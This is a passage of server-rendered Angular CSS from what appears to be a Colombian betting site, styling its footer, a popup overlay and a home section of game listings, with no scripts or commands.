    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
      transition: transform .3s, filter .3s
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] {
      padding: 8px 0;
      overflow: hidden;
      max-height: 0;
      color: #001849;
      transition: color .7s ease-in-out, max-height .5s ease-in-out
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] {
      margin: 0;
      padding: 0;
      list-style-type: none;
      gap: 8px;
      display: flex;
      flex-direction: column
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] li[_ngcontent-serverApp-c3637729144] {
      padding: 5px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] li[_ngcontent-serverApp-c3637729144] a[_ngcontent-serverApp-c3637729144] {
      color: var(--Paleta-Marca-2, #5fb3e1);
      cursor: pointer;
      transition: all .3s ease;
      display: inline-block;
      position: relative
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] li[_ngcontent-serverApp-c3637729144] a[_ngcontent-serverApp-c3637729144]:after {
      content: "";
      position: absolute;
      width: 100%;
      transform: scaleX(0);
      height: 2px;
      bottom: 0;
      left: 0;
      background-color: var(--Paleta-Marca-2, #5fb3e1);
      transform-origin: bottom right;
      transition: transform .3s ease-out
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] li[_ngcontent-serverApp-c3637729144] a[_ngcontent-serverApp-c3637729144]:hover {
      color: var(--Paleta-Marca-2, #52a0c9);
      transform: scale(1.05)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] li[_ngcontent-serverApp-c3637729144] a[_ngcontent-serverApp-c3637729144]:hover:after {
      transform: scaleX(1);
      transform-origin: bottom left
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content.multi-column[_ngcontent-serverApp-c3637729144] {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      grid-gap: 10px;
      width: 325%
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content.multi-column[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] {
      grid-column: span 3;
      display: contents
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content.multi-column[_ngcontent-serverApp-c3637729144] ul[_ngcontent-serverApp-c3637729144] li[_ngcontent-serverApp-c3637729144] {
      padding: 5px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section.active-section[_ngcontent-serverApp-c3637729144] .footer-header[_ngcontent-serverApp-c3637729144] {
      background-color: #5fb3e1;
      border-radius: 50px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section.active-section[_ngcontent-serverApp-c3637729144] .footer-title[_ngcontent-serverApp-c3637729144] {
      color: #100f0f
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section.active-section[_ngcontent-serverApp-c3637729144] .footer-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144],
    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section.active-section[_ngcontent-serverApp-c3637729144] .footer-image[_ngcontent-serverApp-c3637729144] img.rotated[_ngcontent-serverApp-c3637729144] {
      transform: rotate(45deg)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section.active-section[_ngcontent-serverApp-c3637729144] .footer-image[_ngcontent-serverApp-c3637729144] img.black-icon[_ngcontent-serverApp-c3637729144] {
      filter: brightness(.1)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section.active-section[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] {
      max-height: 250px;
      color: #5fb3e1;
      z-index: 10;
      position: relative
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-affiliate[_ngcontent-serverApp-c3637729144] {
      text-align: left;
      width: 133px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-affiliate[_ngcontent-serverApp-c3637729144] h3[_ngcontent-serverApp-c3637729144] {
      margin: 0;
      font-size: 14px;
      font-weight: 400
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-affiliate[_ngcontent-serverApp-c3637729144] .affiliate-link[_ngcontent-serverApp-c3637729144] {
      color: #fff;
      font-size: 16px;
      font-weight: 700;
      text-decoration: none
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-affiliate[_ngcontent-serverApp-c3637729144] .affiliate-link[_ngcontent-serverApp-c3637729144]:hover {
      text-decoration: underline
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-affiliate[_ngcontent-serverApp-c3637729144] .footer-image-affiliate[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
      transition: filter .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-affiliate[_ngcontent-serverApp-c3637729144] .footer-image-affiliate[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
      filter: drop-shadow(0 0 2px #5fb3e1) drop-shadow(0 0 5px #5fb3e1)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-divider[_ngcontent-serverApp-c3637729144] {
      margin: 3em 0
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-partners[_ngcontent-serverApp-c3637729144] {
      text-align: center;
      margin-bottom: 3em;
      display: grid;
      grid-template-columns: repeat(auto-fill, 10em);
      justify-content: space-around;
      gap: 3em;
      align-items: center
    }

    .footer[_ngcontent-serverApp-c3637729144] .partners-logos[_ngcontent-serverApp-c3637729144] {
      object-fit: contain
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] {
      text-align: center;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      justify-content: space-around;
      gap: 30px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] .sponsor-logos[_ngcontent-serverApp-c3637729144] {
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-wrap: wrap;
      flex-basis: 5%
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] .sponsor-logos[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
      width: 100%;
      height: auto;
      max-width: 60px;
      transition: filter .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] .sponsor-logos[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
      filter: drop-shadow(0 0 4px #5fb3e1) drop-shadow(0 0 5px #5fb3e1)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] h4[_ngcontent-serverApp-c3637729144] {
      margin-top: 10px;
      font-size: 16px;
      font-weight: 700
    }

    .footer[_ngcontent-serverApp-c3637729144] .oficcial-sponsors[_ngcontent-serverApp-c3637729144] {
      color: #fff;
      text-align: center;
      font-family: Montserrat;
      font-size: 16px;
      font-style: normal;
      font-weight: 700;
      line-height: normal;
      letter-spacing: 8px;
      margin-top: 20px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-social[_ngcontent-serverApp-c3637729144] {
      display: flex;
      justify-content: center;
      gap: 6px;
      justify-content: space-around;
      flex-wrap: wrap;
      width: 50%;
      margin: 60px auto 20px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-social[_ngcontent-serverApp-c3637729144] .social-logos[_ngcontent-serverApp-c3637729144] {
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-basis: 7%
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-social[_ngcontent-serverApp-c3637729144] .social-logos[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
      width: 100%;
      transition: filter .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-social[_ngcontent-serverApp-c3637729144] .social-logos[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
      filter: brightness(1.2)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-regulation[_ngcontent-serverApp-c3637729144] {
      display: flex;
      justify-content: center;
      gap: 6px;
      justify-content: space-around;
      flex-wrap: wrap;
      width: 50%;
      margin: 60px auto 20px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-regulation[_ngcontent-serverApp-c3637729144] .regulation-logos[_ngcontent-serverApp-c3637729144] {
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-basis: auto
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-regulation[_ngcontent-serverApp-c3637729144] .regulation-logos[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
      width: 100%;
      transition: filter .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-regulation[_ngcontent-serverApp-c3637729144] .regulation-logos[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
      filter: brightness(1.2)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] {
      margin-top: 100px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-title[_ngcontent-serverApp-c3637729144] {
      color: #fff;
      text-align: center;
      font-family: Montserrat;
      font-size: 12px;
      font-style: normal;
      font-weight: 700;
      line-height: normal;
      margin-bottom: 16px
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-text[_ngcontent-serverApp-c3637729144] {
      color: #fff;
      text-align: center;
      font-family: Montserrat;
      font-size: 12px;
      font-style: normal;
      font-weight: 500;
      line-height: normal
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 30px;
      margin-top: 40px;
      align-self: stretch
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-age-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
      width: 52px;
      height: 52px;
      flex-shrink: 0;
      transition: filter .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-age-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
      filter: brightness(1.2)
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-text[_ngcontent-serverApp-c3637729144] {
      width: 325.523px;
      height: 23.452px;
      flex-shrink: 0;
      color: #fff;
      font-family: Montserrat;
      font-size: .8em;
      font-style: normal;
      line-height: revert;
      font-weight: 500;
      margin: 0
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-coljuegos-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
      width: 92.5px;
      height: 32.226px;
      flex-shrink: 0;
      transition: filter .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-coljuegos-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
      filter: brightness(1.2)
    }

    .footer-version[_ngcontent-serverApp-c3637729144] {
      background-color: #001849;
      color: #b8b8b8;
      text-align: end;
      font-size: 9px;
      font-style: normal;
      font-weight: 500;
      letter-spacing: .5px;
      padding-right: 10px;
      font-style: italic
    }

    .footer-version[_ngcontent-serverApp-c3637729144] p[_ngcontent-serverApp-c3637729144] {
      margin: 0
    }

    @media screen and (max-width: 950px) {
      .footer[_ngcontent-serverApp-c3637729144] {
        padding: 70px 40px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-partners[_ngcontent-serverApp-c3637729144] .partners-logos[_ngcontent-serverApp-c3637729144] {
        flex-basis: 12%
      }
    }

    @media screen and (max-width: 768px) {
      .footer[_ngcontent-serverApp-c3637729144] {
        padding-bottom: 10px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] {
        flex-direction: column
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-affiliate[_ngcontent-serverApp-c3637729144] {
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] {
        flex-direction: column;
        padding-bottom: 25px;
        width: 100%
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] {
        width: 100%
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-content.multi-column[_ngcontent-serverApp-c3637729144] {
        grid-template-columns: repeat(2, 1fr);
        width: 100%
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-partners[_ngcontent-serverApp-c3637729144] {
        flex-wrap: wrap
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-partners[_ngcontent-serverApp-c3637729144] .partners-logos[_ngcontent-serverApp-c3637729144] {
        flex-basis: 23%
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] {
        flex-wrap: wrap
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] .sponsor-logos[_ngcontent-serverApp-c3637729144] {
        flex-basis: 9%
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-social[_ngcontent-serverApp-c3637729144] {
        gap: 15px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-social[_ngcontent-serverApp-c3637729144] .social-logos[_ngcontent-serverApp-c3637729144] {
        flex-basis: 7%;
        min-width: 35px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-title[_ngcontent-serverApp-c3637729144],
      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-text[_ngcontent-serverApp-c3637729144] {
        text-align: center;
        font-size: 12px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] {
        display: flex;
        flex-direction: row;
        align-items: center;
        gap: 10px;
        flex-shrink: 0;
        height: 33.263px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-age-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
        width: 33.263px;
        height: 33.263px;
        flex-shrink: 0;
        transition: filter .3s ease
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-age-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
        filter: brightness(1.2)
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-text[_ngcontent-serverApp-c3637729144] {
        width: 229.873px;
        height: 15.001px;
        flex-shrink: 0;
        font-size: .6em;
        font-weight: 400
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-coljuegos-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144] {
        width: 59.169px;
        height: 20.614px;
        flex-shrink: 0;
        transition: filter .3s ease
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-info[_ngcontent-serverApp-c3637729144] .footer-warnings[_ngcontent-serverApp-c3637729144] .footer-coljuegos-image[_ngcontent-serverApp-c3637729144] img[_ngcontent-serverApp-c3637729144]:hover {
        filter: brightness(1.2)
      }
    }

    @media screen and (max-width: 500px) {
      .footer[_ngcontent-serverApp-c3637729144] {
        padding: 20px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-partners[_ngcontent-serverApp-c3637729144] {
        padding: 0 32px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-partners[_ngcontent-serverApp-c3637729144] .partners-logos[_ngcontent-serverApp-c3637729144] {
        flex-basis: 32%;
        min-width: 100px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] {
        padding: 0 32px;
        flex-wrap: wrap;
        gap: 22px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-sponsors[_ngcontent-serverApp-c3637729144] .sponsor-logos[_ngcontent-serverApp-c3637729144] {
        flex-basis: 7%;
        min-width: 40px
      }

      .footer[_ngcontent-serverApp-c3637729144] .oficcial-sponsors[_ngcontent-serverApp-c3637729144] {
        color: #fff;
        text-align: center;
        font-size: 14px;
        font-style: normal;
        font-weight: 700;
        letter-spacing: 7px;
        margin-top: 40px
      }
    }

    @media screen and (max-width: 375px) {
      .footer[_ngcontent-serverApp-c3637729144] {
        padding: 10px 5px
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-partners[_ngcontent-serverApp-c3637729144] {
        padding: 0
      }

      .footer[_ngcontent-serverApp-c3637729144] .footer-social[_ngcontent-serverApp-c3637729144] {
        width: 60%
      }

      .footer-divider[_ngcontent-serverApp-c3637729144] {
        margin: 3em 0
      }

      .footer-sponsors[_ngcontent-serverApp-c3637729144] {
        flex-wrap: wrap
      }
    }
  </style>
  <style>
    .overlay[_ngcontent-serverApp-c3232222433] {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #00000080;
      z-index: 1001
    }

    .overlay.light-overlay[_ngcontent-serverApp-c3232222433] {
      pointer-events: none
    }

    .overlay.half-overlay[_ngcontent-serverApp-c3232222433] {
      height: 20%;
      top: 0
    }

    .none[_ngcontent-serverApp-c3232222433] {
      background: none
    }

    .overlay-mid[_ngcontent-serverApp-c3232222433] {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #0000001a;
      z-index: 1001;
      pointer-events: none
    }

    .popup[_ngcontent-serverApp-c3232222433] {
      position: fixed;
      bottom: 0;
      width: 100%;
      height: 180px;
      background-color: #fff;
      opacity: .95;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1002;
      font-family: Montserrat
    }

    .popup[_ngcontent-serverApp-c3232222433] .popup-content[_ngcontent-serverApp-c3232222433] {
      border: none;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin: 0 auto;
      padding: 0;
      width: 100%
    }

    .popup[_ngcontent-serverApp-c3232222433] .popup-title[_ngcontent-serverApp-c3232222433] {
      color: var(--Primario-1, #002361);
      text-align: center;
      font-size: 16px;
      font-weight: 600;
      margin: 0
    }

    .popup[_ngcontent-serverApp-c3232222433] .popup-link[_ngcontent-serverApp-c3232222433] {
      color: var(--Paleta-Marca-2, #5fb3e1);
      text-align: center;
      font-size: 16px;
      font-weight: 600;
      margin: 0;
      cursor: pointer
    }

    .popup[_ngcontent-serverApp-c3232222433] .popup-link[_ngcontent-serverApp-c3232222433] span[_ngcontent-serverApp-c3232222433] {
      color: var(--Paleta-Marca-2, #5fb3e1);
      font-size: 16px;
      font-weight: 600;
      text-decoration-line: underline;
      text-decoration-style: solid;
      -webkit-text-decoration-skip-ink: none;
      text-decoration-skip-ink: none;
      text-decoration-thickness: auto;
      text-underline-offset: auto;
      text-underline-position: from-font;
      cursor: pointer
    }

    .popup[_ngcontent-serverApp-c3232222433] .popup-button[_ngcontent-serverApp-c3232222433] {
      display: flex;
      width: 232px;
      height: 40px;
      padding: 4px 16px;
      justify-content: center;
      align-items: center;
      gap: 10px;
      border-radius: 8px;
      background: var(--Paleta-CTA-1, #00ae42);
      border: none;
      color: var(--Paleta-Neutros-1, #fff);
      text-align: center;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color .3s
    }

    .popup[_ngcontent-serverApp-c3232222433] .popup-button[_ngcontent-serverApp-c3232222433]:hover {
      background-color: var(--Paleta-CTA-2, #019f3e)
    }

    .popup[_ngcontent-serverApp-c3232222433] .popup-version[_ngcontent-serverApp-c3232222433] {
      color: var(--Paleta-Neutros-5, #9e9e9e);
      text-align: center;
      font-size: 14px;
      font-weight: 500;
      margin: 0
    }

    @media screen and (max-width: 1440px) {
      .popup[_ngcontent-serverApp-c3232222433] {
        height: 150px
      }

      .popup[_ngcontent-serverApp-c3232222433] .popup-content[_ngcontent-serverApp-c3232222433] {
        gap: 8px;
        padding: 0 10px
      }

      .popup[_ngcontent-serverApp-c3232222433] .popup-title[_ngcontent-serverApp-c3232222433],
      .popup[_ngcontent-serverApp-c3232222433] .popup-link[_ngcontent-serverApp-c3232222433],
      .popup[_ngcontent-serverApp-c3232222433] .popup-link[_ngcontent-serverApp-c3232222433] span[_ngcontent-serverApp-c3232222433] {
        font-size: 14px
      }

      .popup[_ngcontent-serverApp-c3232222433] .popup-button[_ngcontent-serverApp-c3232222433] {
        font-size: 14px;
        width: 220px;
        height: 35px
      }

      .popup[_ngcontent-serverApp-c3232222433] .popup-version[_ngcontent-serverApp-c3232222433] {
        font-size: 12px
      }
    }

    @media screen and (max-width: 768px) {
      .popup[_ngcontent-serverApp-c3232222433] {
        height: 160px
      }

      .popup[_ngcontent-serverApp-c3232222433] .popup-content[_ngcontent-serverApp-c3232222433] {
        gap: 10px
      }

      .popup[_ngcontent-serverApp-c3232222433] .popup-link[_ngcontent-serverApp-c3232222433] {
        order: 4
      }

      .popup[_ngcontent-serverApp-c3232222433] .popup-button[_ngcontent-serverApp-c3232222433] {
        order: 3;
        width: 175px;
        height: 33px
      }
    }
  </style>
  <style>
    .homedisp[_ngcontent-serverApp-c170135771] {
      display: flex;
      flex-direction: column
    }

    .play-btn[_ngcontent-serverApp-c170135771] {
      min-width: 220px;
      border-radius: 5px
    }

    .play-btn[_ngcontent-serverApp-c170135771]:hover {
      color: #fff
    }

    .play-btn[_ngcontent-serverApp-c170135771] h2[_ngcontent-serverApp-c170135771],
    .play-btn[_ngcontent-serverApp-c170135771] h3[_ngcontent-serverApp-c170135771] {
      font-size: 14px
    }

    .btn[_ngcontent-serverApp-c170135771] {
      border-radius: 3px !important
    }

    .container[_ngcontent-serverApp-c170135771] {
      background-color: #c6d8e8 !important
    }

    .homeenlaces[_ngcontent-serverApp-c170135771] {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      background-color: #021f5a;
      min-height: 120px
    }

    .homeenlaces[_ngcontent-serverApp-c170135771] .bordes[_ngcontent-serverApp-c170135771] {
      display: grid;
      grid-template-columns: 2fr 1fr;
      align-items: center
    }

    .homeenlaces[_ngcontent-serverApp-c170135771] .bordes[_ngcontent-serverApp-c170135771] i[_ngcontent-serverApp-c170135771] {
      color: #fff;
      margin: auto
    }

    .homeenlaces[_ngcontent-serverApp-c170135771] .bordes[_ngcontent-serverApp-c170135771] a[_ngcontent-serverApp-c170135771]:hover {
      text-decoration: none !important;
      cursor: pointer
    }

    .homeenlaces[_ngcontent-serverApp-c170135771] .bordesinfo[_ngcontent-serverApp-c170135771] {
      display: flex;
      flex-direction: column;
      align-content: flex-start;
      margin: 0 5% 0 15%;
      padding: 5px
    }

    .homeenlaces[_ngcontent-serverApp-c170135771] .betboton[_ngcontent-serverApp-c170135771] {
      background-color: #001849;
      border-radius: 30px;
      width: 1.5em;
      height: 1.5em;
      display: flex;
      align-content: center;
      justify-content: center;
      align-items: center;
      font-size: 28px;
      margin: 20px;
      padding: 22px
    }

    .homeenlaces[_ngcontent-serverApp-c170135771] .betboton[_ngcontent-serverApp-c170135771] .betboton[_ngcontent-serverApp-c170135771]:hover {
      transform: scale(1.1)
    }

    .hometitulos[_ngcontent-serverApp-c170135771] {
      font-size: 1.5em;
      font-weight: 700;
      color: #fff
    }

    .hometextos[_ngcontent-serverApp-c170135771] {
      font-size: 1em;
      font-weight: 700;
      color: #3dafdf;
      min-width: 150px;
      max-width: 300px
    }

    .homejuegos[_ngcontent-serverApp-c170135771] {
      background-color: #c6d8e8;
      min-height: 1200px;
      display: grid;
      grid-template-rows: 1fr 1fr 1fr;
      grid-template-columns: 1fr
    }

    .homejuegosunitario[_ngcontent-serverApp-c170135771] {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2% 15% 0;
      max-height: 500px
    }

    .homehuegoscontenedor[_ngcontent-serverApp-c170135771] {
      display: flex;
      align-content: center;
      justify-content: center
    }

    .homejuegosimagen[_ngcontent-serverApp-c170135771] {
      max-width: 400px;
      max-height: 400px
    }

    .homejuegostexto[_ngcontent-serverApp-c170135771] {
      margin: 30px
    }

    .homejuegosdesc[_ngcontent-serverApp-c170135771] {
      font-size: 1rem;
      font-weight: 700;
      color: #072965;
      max-width: 450px;
      margin: 5px
    }

    .play-title[_ngcontent-serverApp-c170135771] {
      font-size: 1.4rem;
      font-weight: 600;
      line-height: 1.4em;
      padding: 1em 8em 0
    }

    .apuestale[_ngcontent-serverApp-c170135771] {
      display: flex;
      align-content: center;
      justify-content: center;
      flex-direction: column;
      min-height: 180px;
      background-color: #001849
    }

    @media (max-width: 520px) {
      .jackpod[_ngcontent-serverApp-c170135771] iframe[_ngcontent-serverApp-c170135771] {
        height: 258px;
        border-radius: 10px
      }

      .homeenlaces[_ngcontent-serverApp-c170135771] {
        grid-template-rows: 1fr 1fr 1fr;
        grid-template-columns: 1fr;
        height: 250px
      }

      .homejuegos[_ngcontent-serverApp-c170135771] {
        min-height: 1600px
      }

      .homejuegosdesc[_ngcontent-serverApp-c170135771] {
        max-width: 300px;
        text-align: center;
        font-size: .8rem
      }

      .homejuegosunitario[_ngcontent-serverApp-c170135771] {
        display: grid;
        grid-template-rows: 1fr 1fr;
        grid-template-columns: 1fr;
        align-items: center;
        justify-content: space-evenly;
        min-width: 290px;
        padding: 10px 0
      }

      .homejuegostexto[_ngcontent-serverApp-c170135771] {
        display: flex;
        align-items: center;
        align-content: center;
        justify-content: center;
        flex-direction: column
      }

      .casinostexto[_ngcontent-serverApp-c170135771] {
        grid-row: 2/3
      }

      .casinoimg[_ngcontent-serverApp-c170135771] {
        grid-row: 1/2
      }

      .homejuegosimagen[_ngcontent-serverApp-c170135771] {
        max-width: 250px;
        max-height: 250px;
        padding: 0 30px
      }

